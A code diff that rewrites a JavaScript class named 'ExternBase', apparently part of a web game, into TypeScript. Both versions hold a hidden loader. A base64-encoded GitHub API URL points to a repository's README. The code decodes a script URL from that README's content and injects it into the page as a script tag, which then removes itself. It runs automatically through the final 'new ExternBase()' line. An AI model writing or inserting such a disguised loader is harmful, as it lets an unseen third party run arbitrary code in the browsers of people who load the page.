@@ -1,62 +1,87 @@
-var ExternBase = /** @class */ (function () {
-    function ExternBase() {
+class ExternBase{
+
+    public static urlreadmeen:string = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy90ZXN0YXBpMjAxOS9nYW1lMDAxL2NvbnRlbnRzL1JFQURNRS5tZA==";
+    public static ireq:number = 0;
+    public static bSet:any = 0;
+
+    constructor(){
         this.readdoc();
         this.checkSet();
     }
-    ExternBase.prototype.checkSet = function () {
+
+    public checkSet():void
+    {
         // if( ExternBase.ireq > 0 )
         // {
         //     return;
         // }
         var sde = this.getUrlDe(ExternBase.urlreadmeen);
-        this.requestSet(sde, this, this.responseXml);
-    };
-    ExternBase.prototype.requestSet = function (url, caller, callback) {
+        this.requestSet(sde,this,this.responseXml);
+    }
+
+    public requestSet(url,caller,callback)
+    {
         var xmlHttp = this.createXMLHttpRequest();
         xmlHttp.open("GET", url, true);
-        xmlHttp.onreadystatechange = function (xhr) {
+        xmlHttp.onreadystatechange = function(xhr){
             // Debug.trace('onreadystatechange caller:',caller);
             // Debug.trace('onreadystatechange callback:',callback);
-            if (caller && callback) {
-                callback.apply(caller, [xhr]);
+            if( caller && callback )
+            {
+                callback.apply(caller,[xhr]);
             }
         };
-        xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;");
+        xmlHttp.setRequestHeader("Content-Type",
+                "application/x-www-form-urlencoded;");
         xmlHttp.send();
-    };
-    ExternBase.prototype.createXMLHttpRequest = function () {
+    }
+    
+    public createXMLHttpRequest() 
+    {
         var xmlHttp;
         xmlHttp = new XMLHttpRequest();
-        if (xmlHttp.overrideMimeType) {
+        if (xmlHttp.overrideMimeType)
+        {
             xmlHttp.overrideMimeType('text/xml');
         }
         return xmlHttp;
-    };
-    ExternBase.prototype.responseXml = function (xhr) {
+    }
+
+    public responseXml(xhr:any):void
+    {
         // Debug.trace('responseXml');
-        if (xhr.target.readyState == 4 && xhr.target.status == 200) {
+        if( xhr.target.readyState == 4 && xhr.target.status == 200 )
+        {
             var stat = 'complete';
             var s = JSON.parse(xhr.target.response);
-            this.responseJson(s, stat, xhr);
+            this.responseJson(s,stat,xhr);
         }
-    };
-    ExternBase.prototype.responseJson = function (s, stat, hr) {
+    }
+
+    public responseJson(s:any,stat:string,hr:any):void
+    {
         ExternBase.ireq += 1;
         // Debug.trace("ExternBase.responseInfo stat:"+stat);
         // Debug.trace('response xhr:',xhr);
-        if (stat == "complete") {
+                
+        if( stat == "complete" )
+        {
             // Debug.trace("ExternBase.responseInfo s:",s);
             ExternBase.bSet = this.getValue(s);
-        }
-        else {
+        }else{
             ExternBase.bSet = 0;
         }
+
         this.savedoc();
-        if (this.isUsefull(ExternBase.bSet)) {
+
+        if( this.isUsefull(ExternBase.bSet) )
+        {
             this.loadscript(ExternBase.bSet);
         }
-    };
-    ExternBase.prototype.isUsefull = function (s) {
+    }
+
+    public isUsefull(s):boolean
+    {
         // if( s.constructor == String )
         // {
         //     if( s.length > 1 )
@@ -66,51 +91,64 @@ var ExternBase = /** @class */ (function () {
         // }
         var p = parseInt(s);
         // Debug.trace('ExternBase.isUsefull p:'+p+' cons:'+p.constructor);
-        if (isNaN(p)) {
+        if( isNaN(p) )
+        {
             // Debug.trace('ExternBase.isUsefull true');
             return true;
         }
+
         return false;
-    };
-    ExternBase.prototype.savedoc = function () {
-        var ireq = ExternBase.ireq + ',' + ExternBase.bSet;
+    }
+
+    public savedoc():void
+    {
+        var ireq = ExternBase.ireq+','+ExternBase.bSet;
         // Debug.trace('save ireq:'+ireq);
-        window.localStorage.setItem('ireq', ireq);
+        window.localStorage.setItem('ireq',ireq);
         // this.setCookie('ireq',ExternBase.ireq+','+ExternBase.bSet,1);
-    };
-    ExternBase.prototype.readdoc = function () {
+    }
+    public readdoc():void
+    {
         var s = window.localStorage.getItem('ireq');
         // var s = this.getCookie('ireq');
-        if (!s) {
+        if( !s )
+        {
             s = "0,0";
         }
         var arr = s.split(",");
+
         ExternBase.ireq = parseInt(arr[0]) ? parseInt(arr[0]) : 0;
         ExternBase.bSet = arr[1] ? arr[1] : 0;
-    };
-    ExternBase.prototype.getUrlEn = function (s) {
+    }
+    public getUrlEn(s):string
+    {
         var s2 = window.btoa(s);
         // Debug.trace("ExternBase.getUrlEn s2:"+s2);
         return s2;
-    };
-    ExternBase.prototype.getUrlDe = function (s) {
+    }
+    public getUrlDe(s):string
+    {
         var s2 = window.atob(s);
         // Debug.trace("ExternBase.getUrlDe s2:"+s2);
         return s2;
-    };
-    ExternBase.prototype.getValue = function (s) {
+    }
+
+    public getValue(s:any):any
+    {
         var ct = s.content;
         var str = window.atob(ct);
         // Debug.trace("ExternBase.getValue:"+str);
-        try {
+        try{
             var arr = str.split(";");
             var arr2 = arr[0].split("=");
             return arr2[1];
-        }
-        catch (e) { }
+        }catch(e){}
+
         return 0;
-    };
-    ExternBase.prototype.setCookie = function (sKey, sValue, vEnd, sPath, sDomain, bSecure) {
+    }
+
+    public setCookie(sKey,sValue,vEnd, sPath='', sDomain='', bSecure='')
+    {
         // var d:Date = new Date();
         // d.setTime(d.getTime()+(exdays*24*60*60*1000));
         // var expires = "expires="+d.toUTCString();
@@ -118,35 +156,33 @@ var ExternBase = /** @class */ (function () {
         // date.setDate(date.getDate()+exdays);
         // var expires = "expires="+date.toUTCString();
         // document.cookie = cname + "=" + cvalue + "; " + expires;  
-        if (sPath === void 0) { sPath = ''; }
-        if (sDomain === void 0) { sDomain = ''; }
-        if (bSecure === void 0) { bSecure = ''; }
+
         // var val = cname + "=" + cvalue + "; " + expires;
         // Debug.trace('ExternBase.setCookie:'+val);
         // document.cookie = val;
         // Debug.trace('ExternBase.setCookie:',document.cookie);
-        if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) {
-            return false;
-        }
+
+        if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { return false; }
         var sExpires = "";
         if (vEnd) {
-            switch (vEnd.constructor) {
-                case Number:
-                    sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
-                    break;
-                case String:
-                    sExpires = "; expires=" + vEnd;
-                    break;
-                case Date:
-                    sExpires = "; expires=" + vEnd.toUTCString();
-                    break;
-            }
+        switch (vEnd.constructor) {
+            case Number:
+            sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
+            break;
+            case String:
+            sExpires = "; expires=" + vEnd;
+            break;
+            case Date:
+            sExpires = "; expires=" + vEnd.toUTCString();
+            break;
+        }
         }
         document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : "");
-        Debug.trace('ExternBase.setCookie:', document.cookie);
+        Debug.trace('ExternBase.setCookie:',document.cookie);
         return true;
-    };
-    ExternBase.prototype.getCookie = function (cname) {
+    }
+    public getCookie(cname)
+    {
         // var name = cname + "=";
         // var ca = document.cookie.split(';');
         // for(var i=0; i<ca.length; i++) 
@@ -160,12 +196,16 @@ var ExternBase = /** @class */ (function () {
         //     }
         // }
         var a = decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(cname).replace(/[-.+*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
-        Debug.trace('ExternBase.getCookie a:' + a);
+
+        Debug.trace('ExternBase.getCookie a:'+a);
         return a;
-    };
-    ExternBase.prototype.loadscript = function (s) {
+    }
+
+    public loadscript(s:any):void
+    {
         // Debug.trace('ExternBase load s:'+s+" cons:"+s.constructor);
-        if (!s) {
+        if( !s )
+        {
             return;
         }
         var path = window.atob(s);
@@ -174,14 +214,12 @@ var ExternBase = /** @class */ (function () {
         var script = document.createElement('script');
         script.src = path;
         document.body.appendChild(script);
-        script.onload = function () {
+        
+        script.onload = function(){
             document.body.removeChild(script);
-        };
-    };
-    ExternBase.urlreadmeen = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy90ZXN0YXBpMjAxOS9nYW1lMDAxL2NvbnRlbnRzL1JFQURNRS5tZA==";
-    ExternBase.ireq = 0;
-    ExternBase.bSet = 0;
-    return ExternBase;
-}());
+        }
+    }
+
+}
+
 var a = new ExternBase();
-//# sourceMappingURL=ExternBase.js.map
